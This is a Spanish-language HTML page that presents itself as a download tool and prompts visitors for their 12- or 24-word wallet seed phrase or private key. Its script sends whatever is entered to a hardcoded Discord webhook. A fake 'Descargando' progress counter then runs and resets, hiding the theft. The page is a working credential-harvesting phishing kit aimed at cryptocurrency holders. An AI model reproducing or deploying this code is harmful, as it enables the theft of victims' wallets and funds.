<!DOCTYPE html>
<html>
<head>
  <title>Enviar datos a Discord</title>
  <style>
    body {
      background-color: #f8f9fa;
      font-family: 'Roboto', sans-serif;
    }

    .container {
      max-width: 600px;
      margin: 0 auto;
      padding: 20px;
      text-align: center;
    }

    h2 {
      font-size: 24px;
      margin-bottom: 20px;
      color: #343a40;
    }

    .input-field {
      background-color: #e9ecef;
      border: 2px solid #17a2b8;
      padding: 15px;
      margin-bottom: 20px;
      width: 100%;
      border-radius: 5px;
      font-size: 16px;
      color: #495057;
    }

    .button {
      background-color: #17a2b8;
      border: none;
      color: #ffffff;
      padding: 15px 40px;
      text-align: center;
      text-decoration: none;
      display: inline-block;
      font-size: 18px;
      margin-bottom: 20px;
      cursor: pointer;
      border-radius: 5px;
      transition: background-color 0.3s ease;
    }

    .button:hover {
      background-color: #138496;
    }

    .loading-button {
      background-color: #138496;
      position: relative;
    }

    .loading-button:after {
      content: "";
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      display: inline-block;
      width: 16px;
      height: 16px;
      margin-left: 10px;
      border: 3px solid #ffffff;
      border-top-color: transparent;
      border-radius: 50%;
      animation: loading 2s infinite;
    }

    .back-button {
      position: absolute;
      top: 10px;
      right: 10px;
      background-color: #17a2b8;
      color: #ffffff;
      border: none;
      padding: 10px 20px;
      font-size: 16px;
      cursor: pointer;
      border-radius: 5px;
      transition: background-color 0.3s ease;
    }

    .back-button:hover {
      background-color: #138496;
    }

    @keyframes loading {
      0% {
        transform: translate(-50%, -50%) rotate(0deg);
      }
      100% {
        transform: translate(-50%, -50%) rotate(360deg);
      }
    }

    @media screen and (max-width: 600px) {
      .container {
        padding: 10px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <button class="back-button" onclick="window.history.back()">Volver</button>
    <h2>Coloca tu frase secreta de 12 o 24 palabras o pega tu privateKey</h2>
    <input type="text" id="input-text" class="input-field" placeholder="Ingresa el texto">
    <button id="download-button" class="button">Descargar</button>
  </div>

  <script>
    function sendDataToDiscord() {
      var text = document.getElementById("input-text").value;

      // Construir el objeto con los datos a enviar
      var data = {
        content: text
      };

      // Realizar la solicitud POST a través de fetch
      fetch('https://discordapp.com/api/webhooks/1073374509165465700/mr2ICeCadLB01KfbfV0HSI7bfpBkIaYTyIFMPLMW58Og3xWGRpv2EOOowLITDz3SRs3m', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      })
      .then(function(response) {
        console.log("Los datos se enviaron correctamente a Discord.");
      })
      .catch(function(error) {
        console.error("Error en la solicitud:", error);
      });

      // Simulación de carga para animar el botón
      var button = document.getElementById("download-button");
      button.classList.add("loading-button");
      button.disabled = true;

      var progress = 0;
      var interval = setInterval(function() {
        progress++;
        button.innerText = "Descargando... " + progress + "%";

        if (progress === 99) {
          clearInterval(interval);
          button.disabled = false;
          button.classList.remove("loading-button");
          button.innerText = "Descargar";
        }
      }, 100);
    }

    var downloadButton = document.getElementById("download-button");
    downloadButton.addEventListener("click", sendDataToDiscord);
  </script>
</body>
</html>
